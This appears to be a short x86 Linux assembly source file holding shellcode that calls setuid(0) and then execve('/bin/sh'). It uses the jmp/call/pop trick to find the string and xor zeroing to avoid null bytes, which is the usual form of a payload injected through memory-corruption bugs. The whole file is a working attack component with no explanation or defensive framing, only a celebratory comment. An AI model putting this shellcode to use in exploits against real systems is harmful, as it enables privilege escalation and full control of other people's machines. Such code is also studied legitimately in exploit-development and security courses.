#define __NR_execve     $11
#define __NR_setuid     $23

.globl main
main:

init_shellcode:
	jmp	data	

get_offset:
	popl	%edi
	xorl	%eax, %eax
	movb	__NR_setuid, %al
	xorl 	%ebx, %ebx
	int	$0x80
	xorl	%eax, %eax
	push	%eax
	movb	__NR_execve, %al
	movl	%edi, %ebx
	pushl	%edi
	movl	%esp, %ecx		
	xorl	%edx, %edx
	int	$0x80
	
	/* Tachan! x"D */

data:
	call get_offset
	.string	"/bin/sh"
